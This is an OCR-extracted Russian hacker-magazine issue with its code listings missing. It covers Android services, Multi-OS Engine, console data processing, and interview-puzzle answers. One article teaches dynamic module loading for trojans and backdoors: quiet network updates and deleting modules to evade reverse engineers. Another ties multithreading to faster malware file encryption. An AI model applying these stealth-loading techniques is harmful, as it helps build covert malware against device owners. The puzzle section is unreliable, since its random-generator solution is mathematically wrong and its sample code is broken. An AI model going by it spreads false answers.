   GLKViewController реализует функциональность отображения, этот класс
работает в паре с GLKView для отображения покадровой анимации. Сам же
класс GLKView предназначен для рисования в заднем буфере. GLKViewDelegate
предоставляет делегат для объекта класса GLKView, делегат, в свою очередь,
позволяет рисовать в GLKView без создания его субкласса. Чтобы загрузить
текстуру, достаточно воспользоваться классом GLKTextureLoader. С его помо-
щью можно загрузить двумерную или кубическую текстуру. После использова-
ния текстуру надо удалить функцией glDeleteTextures(), подобно стандарт-
ному OpenGL.
   Для    разработки    графическо-
го приложения под  Android  у  про-
граммиста есть два базовых класса
для работы с графикой под OpenGL
ES:  GLSurfaceView  и  GLSurfaceView.
Renderer.   Первый    предназначен
для  реализации  отображения,  по-
добно GLKViewController. Чтобы вос-
пользоваться     функциональностью
данного класса, надо создать его эк-
земпляр и подключить Renderer. Меж-
ду тем, чтобы добавить возможность
отвечать на события прикосновения,
надо  реализовать  прослушиватели
нажатий  (onTouchEvent).  Интерфейс
GLSurfaceView.Renderer   определяет
методы, необходимые для рисования
графики,   следовательно,  програм-
мист должен реализовать их в отдель-
ном классе, который прикрепить к эк-
земпляру GLSurfaceView. Для загрузки
текстуры в Android-приложение надо
                                              Графика OpenGL в эмуляторе iPhoneнаписать кастомный  код, для  этого
используются  стандартные  функции
OpenGL, такие как glGenTextures, glBindTexture, glTexParameterf.
   Платформонезависимый, или общий, код состоит из функциональности
реализации шейдеров — абстрактного класса ShaderProgramBase. В нем
описываются  методы  glAttachShader,  glLinkProgram,  glLoadShader,
glDeleteShader и другие.

ЗАКЛЮЧЕНИЕ
Multi-OS Engine обещает быть мощной технологией. Даже сейчас, если опу-
стить имеющиеся косяки и недоработки, вырисовывается яркая картина —
фреймворк, на котором можно разрабатывать кросс-платформенные мобиль-
ные приложения. В нем имеются большие упущения, связанные с разработкой
пользовательского интерфейса, но будем надеяться, что в финальной версии
разработчики их поправят.
  Можно  быть  уверенным,  что  Multi-OS  Engine  станет  конкурентом
для Xamarin, поскольку обладает неоспоримыми преимуществами: нако-
пленный опыт использования языка Java, знакомая среда разработки Android
Studio, широкий спектр поддерживаемых библиотек и фреймворков, а глав-
ное, нативное выполнение как Android-, так и iOS-приложений.


Команда разработки этого фреймворка размещается преимущественно в Мо-
скве и Нижнем Новгороде.



В случае открытия внешних проектов может понадобиться установить допол-
нительные SDK. Android Studio проведет установку автоматом. Также Android
Studio предложит обновить инструменты Gradle.



Migeran Analyzer

Чтобы узнать, насколько твое Android-приложение портируемо на iOS, реко-
мендую воспользоваться сервисом Migeran Analyzer. Он бесплатный, только
надо будет зарегистрироваться, в том числе указать твой email, и с помощью
формы залить анализируемый APK-файл. Через непродолжительное время
тебе на ящик придет письмо со ссылкой на страницу, где в процентном соот-
ношении указана портируемая часть и часть, которую придется подготовить
заново, обычно это UI.





                                                                 Результат анализа


Построение в облаке

Виндолюбы могут билдить приложения для iOS через облачный сервис, пре-
доставляемый Intel. Для этого в Android Studio открой Run    Edit Configuration.
В открывшемся окне из ниспадающего списка, появляющегося после нажатия
на плюсе, находящемся в левом верхнем углу, выбери Multi-OS Engine Cloud
Build. Новый элемент будет добавлен в список. Среди его свойств есть кноп-
ки Register и Login. При нажатии на первую ты будешь переведен на страни-
цу сайта Intel для создания учетной записи — ID разработчика. Когда закон-
чишь, в окне настройки облачного построения Android Studio нажми Login и (на
web-странице) введи регистрационные данные. В результате в окне настройки
отобразится email, для которого создан идентификатор.
  Ниже надо указать путь к Provisioning Profile. Его можно создать с помо-
щью утилиты «Связка ключей» или на сайте Apple. Если у тебя есть сертификат
для тестирования на реальном девайсе, укажи путь к нему ниже: в блоке пара-
метров поле «Run on» указывает устройство или эмулятор для тестирования.
   Для тестирования на устройстве ipa-файл можно экспортировать прямо
из Android Studio (Build    Export IPA for Application).
КОДИНГ

 ЗАДАЧИ РАЗДАЕМ     ПО         СЕРВИСАМ


                     РАЗРА-     МНОГОПОТОЧНАЯ                      ЧАСТЬ 2               ANDROID,         ДЛЯ     БОТКА





                                                                           Андрей Пахомов
                                                                                           mailforpahomov@gmail.com



В продолжении темы прошлого номера мы узнаем, каким
образом в Android можно генерировать дополнительные
потоки и зачем это может понадобиться. Сегодня погово-
рим о таком компоненте приложения, как сервисы, и опи-
шем их роли в мобильном мире Android. Сервисы и потоки
тесно переплетены между собой, поэтому, если ты еще
не читал прошлый номер «Хакера», начни с моей статьи,
будет полезно!

СЕРВИСЫ
Компания Google в своей статье  Application Fundamentals, обращенной
к будущим Android-разработчикам, выделяет четыре базовых компонен-
та Android-приложения:  Activity, Service, поставщики содержимого (Content
Providers) и приемники широковещательных сообщений (BroadCast Recievers).
С Activity начинается знакомство с разработкой, о последних двух компонентах
«Хакер» писал раньше (и еще обязательно к ним вернется), поэтому сейчас
поговорим о сервисах.
   Большинство мобильных устройств обладают достаточно скромными ре-
сурсами, а значит, ОС приходится постоянно перераспределять их между ра-
ботающими приложениями. Если в системе нет свободной памяти для нового
запущенного приложения, то ОС принудительно завершает Activity, которые
находятся в состояниях onStop и onPause, а вместе с ними и их дополнитель-
ные потоки.
   Такое положение дел существенно урезает возможности дополнительных
потоков внутри UI — Activity на экране постоянно меняются, а значит, создан-
ные ими потоки не могут жить вечно. Поэтому генерировать дополнительные
потоки в Activity целесообразно только в случае, если вычисления завершатся
не позже, чем пользователь переключится на другое окно, — в противном слу-
чае велик риск потерять результаты или не закончить вычисления.
  И тут на помощь приходят сервисы! По сути дела, это те же самые Activity,
но без графических элементов. Ввиду отсутствия UI они предназначены
для длительных операций, которые могут долгое время выполняться без уча-
стия пользователя. Проигрывание музыки, запись данных для фитнес-трекера,
продолжительный сетевой обмен — все это задачи для сервисов.
   У сервисов в Android существует даже собственный жизненный цикл
(lifecycle), который схож с жизненным циклом Activity, и, не привязанные к кон-
кретному Activity, они работают максимально возможное время. ОС начнет
убивать сервисы только в экстренных ситуациях, если пользователь парал-
лельно с нашим приложением запустит игру, которая съест вообще все ресур-
сы и все равно будет тормозить.





                       Рис. 1. Жизненный цикл сервисов (c) Google


В Android сервисы создаются с помощью класса Service или его наследника
IntentService. Несмотря на схожие названия, их функциональные возможности
и предназначение серьезно отличаются.

INTENTSERVICE
Наиболее простой способ создать свой сервис — это воспользоваться классом
IntentService. Созданный с его помощью сервис запустится в новом потоке, вы-
полнит все необходимые действия, после чего будет остановлен системой.
  В принципе, этого достаточно в большинстве случаев. Чаще всего требует-
ся отправить в фон какую-то тяжеловесную задачу и не морочить себе голову,
выполнилась она или нет, — и тут как раз подойдет IntentService.


Полезная нагрузка размещается в методе onHandleIntent(), который будет
выполнен системой сразу после старта сервиса. После завершения работы
этого метода сервис будет остановлен системой, а ресурсы освобождены.





Передача данных, как и запуск самого сервиса, происходит через уже извест-
ный механизм намерений (Intent).





Любой сервис, как и Activity, необходимо зарегистрировать в манифест-фай-
ле, иначе ОС о нем не узнает и он просто не будет запущен.


Все готово! После выполнения метода startService в работающем прило-
жении появится новый поток, который выполнит необходимые действия, не за-
гружая UI. Но простота реализации приносит и свои минусы:
•  Отсутствует явная связь с главным потоком. После старта сервис начина-
   ет жить своей жизнью, и вернуть результаты вычислений обратно в Activity
  можно только с помощью широковещательных сообщений.
•  IntentService подходит для выполнения редких, разовых операций, посколь-
   ку его конструкция не позволяет выполнять несколько задач одновременно.
   Если IntentService уже чем-то занят, то при повторном запуске сервиса будет
   организована очередь и вычисления будут выполнены последовательно.
•  Операции, выполняемые в IntentService, не могут быть прерваны, а значит,
   сервис будет висеть в памяти до тех пор, пока не завершатся все действия,
   задуманные в методе onHandleIntent.

SERVICE
А теперь настало время познакомиться с родителями :). Я сознательно начал
разговор с наследника — IntentService, поскольку он предельно прост в экс-
плуатации: просит мало, работает долго и уходит незаметно. С «оригиналь-
ным» же Service все сложнее, чем кажется поначалу.
  В статье Services, где разработчики Google рассказывают о своем детище,
он назван компонентом, который позволяет выполнять длительные операции
в фоне. Прочитав вступление, испытываешь огромный соблазн сразу же наки-
дать сервисов в приложение и выкатить релиз. Но не все так просто — к при-
меру, портал Stack Overflow завален вопросами вроде «почему мои сервисы
постоянно выдают ANR-сообщения?».





                                  Рис. 2. Более 60 тысяч вопросов по сервисам в Android

Оказывается, изначально объект класса Service не создает для себя но-
вый поток, а выполняется там, где его инициализировали! Поэтому, создав
в MainActivity новый сервис, разработчик довольно быстро подвесит UI. Что-
бы этого избежать, необходимо внутри сервиса самостоятельно генерировать
потоки (AsyncTask, Loader и так далее — выбирай любой) и помещать ресур-
созатратные вычисления в них.
   Сервис, созданный с помощью одноименного класса, открывает нам дверь
в мир настоящей многопоточности. Это инструмент, позволяющий быстро распа-
раллеливать однотипные задачи, создавая отдельный поток под каждую из них.
   Недавно «Хакер» рассказывал, что в Android достаточно легко написать
зловред, который бы шифровал пользовательские данные стойким ключом.
Тогда мы не акцентировали свое внимание на производительности — файлы
шифровались последовательно, один за другим. Сейчас посмотрим, как с по-
мощью сервиса можно сократить время выполнения операций шифрования.
   Поскольку объекты этого класса могут самостоятельно создавать новые
потоки, мы можем запустить сервис, который будет обрабатывать одновре-
менно максимально возможное число файлов.
   Количество доступных нам потоков заранее неизвестно — это во многом
зависит от ресурса устройства. Но бояться ошибок переполнения не стоит,
за генерацией новых потоков следит класс ThreadPoolExecutor. Он самосто-
ятельно выставляет лимиты по операциям, и в случае необходимости новые
задачи просто встанут в очередь.
   Создавать новые потоки будем с помощью классов Handler и Looper, кото-
рые нам уже знакомы по первой части статьи.




По умолчанию сервис живет в потоке породившего его  Activity. Нас это
не очень устраивает, поэтому в методе OnCreate нужно породить новый поток.





Теперь сервис отвязан от Activity и будет жить своей жизнью. Основная логика
создаваемого сервиса содержится в методе onStartCommand, который будет
выполняться каждый раз при вызове метода startService.





Каждый сервис существует в единственном экземпляре, поэтому многократ-
ный вызов метода startService не размножает экземпляры сервиса, а толь-
ко создает очередь из заданий для него. И если IntentService просто выполнит
все задания последовательно, одно за другим, то благодаря классу Service
у нас появляется возможность запустить все задачи одновременно в незави-
симых потоках. Достаточно в методе onStartCommand создавать новые потоки
для каждой задачи.





ОСТАНОВКА СЕРВИСА
Сервис, созданный с помощью одноименного класса, будет жить, пока его
принудительно не остановят. Сделать это можно либо откуда-то снаружи ме-
тодом stopService, с указанием интента, которым он был запущен, либо вну-
три самого сервиса методом stopSelf.
   Как узнать, что сервис уже все сделал, особенно если мы поставили перед
ним сразу несколько задач? В этом нам поможет параметр startId у метода
onstartcommand — это порядковый номер каждого вызова сервиса, который
увеличивается на единицу при каждом запуске.
   Создав новый поток, разумно завершать его методом stopSelf, указывая
startId в качестве параметра.





С таким параметром ОС не будет сразу завершать сервис, а сравнит пере-
данный идентификатор с тем, который был выдан при последнем запуске
onStartCommand. Если они не равны, значит, в очередь была добавлена новая
задача и сервис остановлен не будет.

ПАРАМЕТРЫ ПЕРЕЗАПУСКА
Сервис — важный компонент приложения, и от стабильности его работы мо-
жет зависеть стабильность всего приложения. Именно поэтому, даже если
ОС и внештатно выгрузит сервис из памяти, есть возможность его запустить
заново, как только появятся свободные ресурсы.
  Метод  onStartCommand  возвращает  переменную,  указывающую ОС,
как следует поступить с сервисом, если он был принудительно остановлен.
К счастью, разработчикам не нужно запоминать сами числа, в классе Service
есть их мнемонические обозначения.
   Существует три варианта того, как ОС может поступить с сервисом, если
он был принудительно завершен.
   START_NOT_STICKY — не будет перезапущен системой, и все останется
так, как есть. Подходит для случая, когда он выполняет не самые важные зада-
чи, и приложение может позже при необходимости самостоятельно его пере-
запустить.
   START_STICKY — будет запущен заново, но в Intent, который ОС создаст
для его запуска, не будет никаких параметров. Такой вариант работает с ау-
диоплеерами — он должен быть активным в фоне, но не обязательно при этом
автоматически начинать проигрывать песни.
   START_REDELIVER_INTENT — сервис будет запущен с теми же параметра-
ми, которые были при его последнем старте. Это удобно, когда в фоне загру-
жается большой файл и его загрузка была прервана.

BOUND SERVICE
Иногда бывает необходимо выполнить большой объем черновой работы,
а потом несколько раз использовать полученные результаты. К примеру, это
может быть загрузка из сети большого XML-файла с последующим парсингом
данных. Конечно, можно как-то кешировать результаты, а затем при необходи-
мости их заново подгружать. Но есть вариант получше — создать сервис, ко-
торый выполнит необходимые расчеты, раздаст данные всем желающим и за-
вершит свою работу.
  Описанный алгоритм мы можем организовать уже имеющимися средства-
ми, но за одним исключением — непонятно, когда услуги сервиса уже больше
не понадобятся и его можно остановить. Эту проблему возможно решить, соз-
дав привязанный (bound) service — это сервис, который будет работать до тех
пор, пока к нему привязан хотя бы один Activity или другой сервис. В случае
если «клиентов» у такого сервиса нет, он автоматически останавливается,
но при необходимости может быть снова запущен.
   Привязанный сервис создается с помощью того же класса Service, но те-
перь необходимо инициализировать метод OnBound.




IBinder — это интерфейс, позволяющий организовать связь между двумя раз-
личными потоками, функционирующими внутри одного процесса. Для его
использования не нужно самостоятельно реализовать этот интерфейс, до-
статочно создать объект класса Binder. Сейчас его основной задачей будет
предоставление ссылки на работающий сервис в Activity.





Чтобы Activity могли подключаться к сервису, разработчики Google создали
класс ServiceConnection, основная задача которого — организовывать взаи-
модействие Activity и сервиса, а также следить, чтобы созданное подключение
работало корректно.




Для работы этого механизма необходимо переопределить методы, отвечаю-
щие за подключение к сервису и отключение от него.





При успешном подключении к сервису в потоке Activity появляется экземпляр
сервиса, к которому произошло подключение. Индикатором состояния под-
ключения к сервису будет булева переменная.




Процедуры подключения к сервису и отключения от него рекомендуется вы-
полнять в методах onStart и onStop. Это разумно, поскольку процедуры за-
пуска/остановки сервиса и подключения к нему достаточно ресурсозатратны
и не должны выполняться слишком часто.





Для получения данных с сервиса достаточно обратиться к нему через его эк-
земпляр, полученный благодаря ServiceConnection.





Вообще говоря, использование сервисов предполагает какие-то длительные
операции. Вполне нормально, что метод getData будет выполняться длитель-
ное время и результат вычислений не вернется мгновенно.





В этом случае стоит вызывать методы сервиса в дополнительных потоках, на-
пример с помощью уже знакомого нам AsyncTask и слабых ссылок.





До тех пор пока сервис привязан к какому-либо Activity, его данные будут со-
храняться, а значит, ими смогут воспользоваться и другие компоненты при-
ложения. В этом и есть плюс привязанных сервисов — достаточно один раз
загрузить и обработать данные, а затем готовые результаты смогут легко по-
лучить остальные участники приложения.

FOREGROUND SERVICE
В некоторых случаях необходимо сделать критически важный сервис, который
будет выгружен из системы только вместе с выключением устройства. Именно
такими сервисами являются аудиоплеер или GPS-трекер. Они будут работать
всегда, даже когда создавшее их приложение будет завершено, и ни одно дру-
гое приложение не сможет вытеснить их из памяти. Если пользователь решил
послушать новый альбом Taylor Swift, то песни в наушниках перестанут играть
только в двух случаях — кто-то нажмет кнопку «Стоп» или в устройстве сядет
аккумулятор.
   Это так называемый сервис переднего плана (foreground service), и его
можно создать как из класса Service, так и из класса IntentService. Но есть не-
большое условие: в панели уведомлений на протяжении всей работы сервиса
должна быть соответствующая информация.
  Создадим сейчас свой сервис, проигрывающий музыку. В этом нам помо-
жет стандартный Android-класс MediaPlayer, который вполне справится с тем,
чтобы открыть файл и бесконечно проигрывать его по кругу. К сожалению,
для более сложных задач лучше поискать другие библиотеки — реализация
MediaPlayer может отличаться в зависимости от вендора устройства, поэтому
приложение может работать нестабильно.
  Создаем наследующий  Service  класс, который реализует интерфейс
MediaPlayer.onPreparedListener.



Старт сервиса, как всегда, организуем через Intent, имя проигрываемого фай-
ла можно передать через его параметры.


Когда песня будет готова к проигрыванию, в сервисе сработает метод
onPrepared из реализуемого интерфейса.





В методе OnStartCommand будет инициализирован
музыкальный плеер и, самое главное, сконстру-
ирован объект, который будет демонстрировать-
ся на панели уведомлений в течение всей работы
сервиса. Это будет совершенно обычное уведом-
ление, созданное с помощью класса Notification.



                                                             Рис. 3. Неубиваемое
                                                       уведомление от привя-
                                                          занного сервиса

Скорее всего, пользовать захочет нажать на выводимое уведомление и по-
пасть в Activity приложения, где можно будет поменять музыку. С этим спра-
вится PendingIntent, способный создать новый стек.




Теперь нужно связать сформированный стек и уведомление. А вывод инфор-
мации о работающем сервисе выполняется методом startForeground с ука-
занием уникального идентификатора.




ЧТО ЖЕ ВЫБРАТЬ?
Итак, за два месяца мы с тобой довольно подробно поговорили о том, где же
можно обработать данные для UI. Давай теперь кратко просуммируем то, что
у нас есть для создания многопоточности в Android.
   Потоки, созданные в Activity, подходят для сравнительно недлительных
действий, результат которых важен только в момент жизни конкретного Activity.
Их можно создать с помощью AsyncTask, AsyncTaskLoader или их аналогов —
все зависит от того, как тебе будет удобней.
  Сервисы существуют в приложении на равных правах с Activity, но не всегда
в отдельном потоке. Они могут распараллелить задачи и выполнять громоздкие
вычисления долгое время, пока на экране будут меняться Activity. IntentService
завершит себя сам, когда выполнит все задачи, а Service будет висеть в фоне.
Применяя сервисы, нужно быть внимательным, он может случайно оказаться
в потоке UI или долго и без дела висеть в памяти, забирая ресурсы.

ЗАКЛЮЧЕНИЕ
Надеюсь, про многопоточность было сказано достаточно, чтобы ты по-
нял ее необходимость и полезность. Вся ли это информация? Конечно, нет,
Android — очень сложная ОС, которая постоянно развивается, и нельзя в двух
статьях разобрать абсолютно все нюансы такой важной темы. В конце концов,
главное — как приложение работает, а не то, как оно написано. Если будут во-
просы, обязательно мне пиши. Удачи!


Исходники примеров, разобранных в статье
Статья о базовых компонентах Android-приложения
О сервисах из первоисточника
КОДИНГ





                                                                                   Евгений Зобнин
                                                                                                                   androidstreet.netМОДУЛИ
ДЛЯ ТРОЯНОВ
И НЕ ТОЛЬКО
ПИШЕМ ПРИЛОЖЕНИЯ С ПОДДЕРЖКОЙ
ПЛАГИНОВ ДЛЯ ANDROID. ЧАСТЬ 2



Когда мы говорим о плагинах и модульных приложени-
ях, то в первую очередь имеем в виду обычный пользо-
вательский софт. Однако модульный дизайн может быть
не менее полезен при разработке руткитов и бэкдоров.
Обычными средствами обновлять такой софт слишком
палевно, да и не всегда возможно, а вот незаметно под-
грузить модуль с новой функциональностью по сети — это
пожалуйста. А если вынести ключевую функциональность
в модули и удалять их сразу после загрузки, то можно се-
рьезно подпортить жизнь реверсеру.

ВМЕСТО ВВЕДЕНИЯ
В классической Java есть класс под названием java.lang.ClassLoader. Его
задача — загружать байт-код указанного класса (файл с расширением .class)
в виртуальную машину во время исполнения приложения. Затем можно со-
здать объект этого класса и вызывать его методы с помощью рефлексии. Та-
кой вот способ динамической загрузки кода, который можно использовать
для написания приложений с расширяемой функциональностью, или, попро-
сту говоря, поддержкой плагинов.
  В Android нет виртуальной машины Java и нет класса ClassLoader, но есть
его аналог DexClassLoader, выполняющий ровно ту же функцию, но в отноше-
нии байт-кода Dalvik (и файлов .dex вместо .class соответственно). И, в от-
личие от настольной Java, где проще положить нужный jar-файл в CLASSPATH
и не возиться с динамической загрузкой, в Android такой подход дает дей-
ствительно много преимуществ, главное из которых в том, что функциональ-
ность приложения можно расширять и обновлять незаметно для пользователя
и ни о чем его не спрашивая. В любой момент твое приложение может скачать
файл с классом с сервера, загрузить, а затем удалить файл.
   Кроме этого, классы можно хранить прямо в пакете APK и загружать во
время старта приложения. Профит здесь в том, что код загружаемых классов
будет отделен от кода самого приложения и находиться в APK «не по адресу»;
инструменты типа apktool, которыми так любят пользоваться реверсеры, их
просто не увидят. С другой стороны, это скорее защита от дурака, так как нор-
мальный реверсер быстро смекнет, что к чему.
   Как бы там ни было, динамическая загрузка классов — очень полез-
ная штука при написании не совсем «белых» приложений, поэтому любой
security-специалист должен знать, как этот механизм работает и как он ис-
пользуется в троянах.

ПРОСТЕЙШИЙ ПРИМЕР
Чтобы все написанное далее было проще понять, сразу приведу пример рабо-
чего загрузчика классов:





В целом здесь все просто: код загружает jar-архив /sdcard/myapp/module.
jar с нашим классом, загружает из него класс com.example.modules.simple.
Module, создает объект и вызывает метод run(). Обрати внимание на три мо-
мента:
•  DexClassLoader умеет загружать как «просто» файлы .dex, так и jar-архивы,
   последние предпочтительнее из-за сжатия и возможности использовать
   цифровую подпись;
•  второй аргумент конструктора DexClassLoader — это каталог, который он
   использует для сохранения оптимизированного байт-кода (odex), для про-
   стоты мы указываем приватный каталог самого приложения;
•  в качестве аргумента метода loadClass всегда необходимо указывать адрес
   класса вместе с именем пакета.

Чтобы проверить данный код на работоспособность, создадим простейший
модуль:





Не торопись создавать новый проект в Android Studio, можешь накидать этот
код в блокноте и собрать его в jar-архив прямо из командной строки:

javac -classpath /путь/до/SDK/platforms/android-23/android.jar
    Module.java
/путь/до/SDK/build-tools/23.0.3/dx --dex --output=module.jar
    Module.class

Удостоверься, что каталоги platforms/android-23 и build-tools/23.0.3
существуют, в твоем случае их имена могут отличаться.
   Если все пройдет гладко, на выходе ты получишь файл module.jar. Оста-
нется только добавить код загрузчика в приложение, положить module.jar
на карту памяти, собрать и запустить приложение.

ДОЛОЙ РЕФЛЕКСИЮ
Рефлексия — хорошая штука, но в данном случае она только мешает. Один ме-
тод без аргументов с ее помощью вызвать нетрудно, однако, если мы хотим,
чтобы наше приложение имело развитый API модулей с множеством методов,
принимающих несколько параметров, нужно придумать что-то более удобное.
Например, использовать заранее определенный интерфейс, который будет
реализовывать каждый модуль.
   Применив такой подход к приведенному выше примеру, мы получим следу-
ющие три файла:
 1. Файл ModuleInterface.java с описанием API:





 2. Файл Module.java с реализацией нашего модуля:





 3. Новый загрузчик модуля (помести в свое приложение):





Это все. Теперь мы можем работать с модулем, как с обычным объектом. Бо-
лее того, система сама отбракует модули (классы), несовместимые с интер-
фейсом, еще на этапе загрузки, поэтому нам не придется задаваться вопро-
сами, а есть ли в модуле нужный нам метод.

КОГДА МОДУЛЕЙ МНОГО
С одним модулем разобрались, но что, если их будет много? Как вести учет
этих модулей и не потеряться среди них? На самом деле все просто — для это-
го можно использовать hashmap. Еще раз изменим загрузчик:





Данный код загружает все jar-файлы из указанного  каталога, загружа-
ет их классы Module, создает на их основе объекты и помещает их в хешмап
modules. Обрати внимание на трюк, использованный при загрузке класса
и размещении объекта в хешмапе. Он нужен для простоты: вместо того чтобы
выяснять принадлежность каждого модуля/класса к пакету, мы просто услови-
лись, что имя jar-файла модуля будет соотноситься с именем пакета по схеме
com.example.modules.ИМЯ_JAR_ФАЙЛА, так что мы сразу знаем полный адрес
класса каждого модуля.
   Например, приведенный ранее модуль принадлежит пакету com.example.
modules.simple (см. директиву package), поэтому его необходимо включить
в jar-архив simple.jar (меняем --output=module.jar на --output=simple.
jar в команде сборки). Когда придет время создать новый модуль (к примеру,
remote_shell), первой строчкой в его исходниках ты укажешь package com.
example.modules.remote_shell.Module; и запакуешь скомпилированный
байт-код в jar-архив remote_shell.jar.
   Имя jar-файла (без расширения) используется также в качестве ключа
в хешмапе, поэтому, зная имя модуля, всегда можно запустить его методы:





                                          Загрузчик модулей в реальном приложении

БЕРЕМ МОДУЛИ С СОБОЙ
На данном этапе у нас уже есть приложение, способное загружать неограни-
ченное количество модулей из указанного каталога и с удобством работать
с ними. Осталось разобраться с тем, как распространять эти модули. Самый
очевидный вариант — загружать их с сервера, пусть наш «троян» делает это
раз в день, а после скачивания модулей запускает загрузчик модулей, чтобы
подгрузить их в приложение. Рассказывать, как сделать это, я не буду, здесь
все элементарно, и решение этой задачи ты найдешь в любой вводной статье
или книге про разработку для Android.
   Еще один вариант — включить модули в пакет с приложением. В этом слу-
чае наш троян будет иметь доступ к необходимым модулям сразу после пер-
вого запуска, что защитит от проблем с выходом в сеть. Когда же сеть появит-
ся, он сможет догружать модули с сервера, если это необходимо.
   Чтобы включить модули в APK, их необходимо поместить в каталог assets
внутри проекта (в нашем случае в assets/modules), а затем реализовать распа-
ковщик модулей в нужный нам каталог. В коде это будет выглядеть примерно так:





Все очень просто. Код находит модули вну-
три пакета и поочередно копирует их в каталог
/sdcard/myapp, из которого затем их можно
будет подгрузить с помощью загрузчика.

ВЫВОДЫ
Создать приложение  для  Android,  которое
сможет обновлять само себя и расширять
свою функциональность незаметно для поль-
зователя, довольно легко, и автор этих строк
неоднократно видел применение такого ме-
тода в реальных троянах. Для чего эту техни-
ку будешь использовать ты — решать только
тебе, однако я хотел бы напомнить, что наш
журнал не поощряет любые незаконные дей-
ствия, а автор статьи будет совсем не рад уз-
нать, что научил кого-то писать трояны, кото-
рых для Android и так уже слишком много.




                                               Включаем модули в APK-пакет
Кодинг





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

  ОТВЕТЫ НА ЗАДАЧИ ОТ КОМПАНИИ ABBYY
     И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЯ




                  Свершилось!
 Аркадий Дьяконов (darkaha@mail.ru) победил задачи,
 поставленные перед нашими читателями экспертами
 компании ABBYY, за что и был награжден сертифика-
           том на FineReader. Слава ему!





ПРАВИЛЬНЫЕ ОТВЕТЫ

Задача 1
Дан массив из целых чисел. Найти такие m <= k, чтобы сумма a[m] +
a[m+1] + ...+ a[k] была максимальна. Время работы должно быть поряд-
ка длины массива.

Решение
Идея алгоритма: ищем первый положительный элемент в последовательно-
сти. Если такого не окажется, то решением будет максимальный элемент. Если
такой элемент нашелся, то считаем, что текущая сумма и максимальная равны
этому элементу. Проходим по массиву. На каждом шаге увеличиваем текущую
сумму на текущий элемент. Если текущая сумма оказалась отрицательной —
обнуляем ее. Проверяем, если значение текущей суммы оказывается больше
максимальной, то максимальной сумме присваиваем текущую.
  Одно из решений задачи:

// Далее считаем, что массив, в котором ищем подмассив,
// именуется как array. Его размер же именуется как arraySize
intmaxSum = array[0];
intmaxStartIdx = 0;
intmaxEndIdx = 0;
intcurrentSum = 0;
intcurrentStartIdx = 0;
for(int i = 0; i <arraySize; i++ ) {
   currentSum += array[i];
   if(currentSum>maxSum ) {
         maxSum = currentSum;
         maxStartIdx = currentStartIdx;
         maxEndIdx = i;
   } elseif(currentSum< 0 ) {
         currentSum = 0;
         currentStart = i + 1;
   }
}


Задача 2
Дан текст, состоящий из N слов, длина которых не превосходит неко-
торой небольшой константы. Предложите хотя бы два способа выве-
сти частоты вхождения слов в текст за субквадратичное время, объяс-
ните их преимущества и недостатки.

Решение
1. Префиксное дерево (оно же бор). Строится за O(length(Text)k), где k —
   размер алфавита. Можно сделать log(k), если при построении в узлах
   дерева хранить какое-то сбалансированное дерево, чтобы искать символ
   за логарифм. Для решения задачи нужно при построении в листьях хранить
   счетчик. Когда при построении дерева прошли слово и добавили новый лист,
   нужно поставить 1 или сделать +1 (если лист уже существовал). Построение
   бора есть тут.
2. Нам понадобится хеш-функция для строки и какая-нибудь хеш-таблица
   для этих же строк. Каждый раз через хеш добавляем строку в таблицу. Если
   строка была, то делаем +1 к счетчику, иначе заводим новый, равный 1 (ис-
   пользуем готовый контейнер CHashTable<CString, int>). Проходим по та-
   блице и проверяем счетчики для вывода статистики.

ЗАДАЧА 3
Даны числительные языка хауса:

   đaribakwai da hamsin da shidda 756
   sittada đaribakwai da biyar 6705
   saba’ada đaribiyar da sittin 7560

Переведите с хауса: saba’in da biyar, đarishidda da sittin da shidda.
Запишите на хауса: 67 и 5605.

Решение
saba’in da biyar — 75
đarishidda da sittin da shidda — 666

67 — sittin da biyar
5605 — hama’a da darishidda da biyar

Задача 4
Есть генератор случайных чисел, который с равной вероятностью ге-
нерирует дискретные значения 1, 2, 3, 4 и 5. Как, имея этот генератор,
получить генератор, который бы равновероятно выдавал дискретные
значения 1, 2, 3, 4, 5, 6 и 7?

Решение
Сгенерируем пять чисел x1, x2, x3, x4, х5.
Их сумма Х = x1 + x2 + x3 + x4 + х5, принимает значение 5 <= X <= 25,
то есть ровно 21 значение. Х%7 + 1 и будет равновероятно выдавать нам чис-
ла от 1 до 7. Может потребоваться несколько выполнений цикла.
UNIXOID
ПОКОРЯЕМ
ТЕРМИНАЛ





КАК МАГИЯ КОНСОЛИ ПОЗВОЛЯЕТ СДЕЛАТЬ
DATA ENGINEERING ПРОЩЕ. ЧАСТЬ 2





   Николай Марков
  enchantner@gmail.com



О, это ты. Проходи, садись поближе к системному блоку,
тут тепло. Настало время приступить ко второй части на-
ших исследований и понабирать еще зеленоватых буко-
вок на черном экране. Сегодня будет настоящий хардкор,
мы привлечем все наши знания, чтобы составить действи-
тельно сложные и почти нечитаемые команды, с помощью
которых перепашем кучу данных в параллельном режиме.

НУЖНО БОЛЬШЕ КРЕСТЬЯН
Мы запомнили множество команд, освоили grep и awk и разобрались, как об-
ходить подводные камни, но еще не можем сказать, что заставляем комп ра-
ботать на все сто процентов. Однако это легко исправить, если всего лишь
научиться использовать несколько ядер процессора  и, например (один
из стандартных подходов), создать очередь для параллельной обработки дан-
ных воркерами.
  Не надо напрягаться, я не буду сейчас рассказывать про тонкости много-
поточного программирования и примитивы синхронизации. Мы же догово-
рились, что все будет в консоли, — так и поступим. А поможет в этом квесте,
как ни странно, еще одна стандартная утилита командной строки, про которую
ты наверняка слышал, — xargs. Да, ее основная задача — это подставлять ре-
зультат выполнения одной команды в качестве аргумента другой, но этим ее
возможности не исчерпываются. Освежим память:

$ find . -name "*.sh" -print0 | xargs -0 -I'{}' mv '{}'
    ~/backup_scripts

Здесь все просто: находим в текущем каталоге все файлы с расширением sh
и скармливаем их поочередно команде mv, которая швыряет их в бэкап. Ключи
-print0 и -0 здесь указывают на то, что данные, поступающие из выхода find
на вход в xargs, будут по-сишному разделены null-байтом. Параметр -I, в свою
очередь, задает шаблон, который будет использоваться при подстановке зна-
чений в управляемую команду.
   Казалось бы, при чем здесь очередь сообщений и воркеры? Сейчас это
просто обычный цикл, в котором на каждой итерации команда mv что-то ку-
да-то копирует. А хитрость вот в чем: никто не говорил, что xargs умеет и обя-
зан запускать ровно один экземпляр команды. Представим, например, такую
структуру каталогов (да, это вывод еще одной полезной консольной команды):





Что получится, если мы запустим такую (абсолютно бесполезную, но все же)
команду?

$ ls | xargs -P3 -n1 ls

Или (а это даже интереснее) что будет, если мы запустим ее несколько раз?

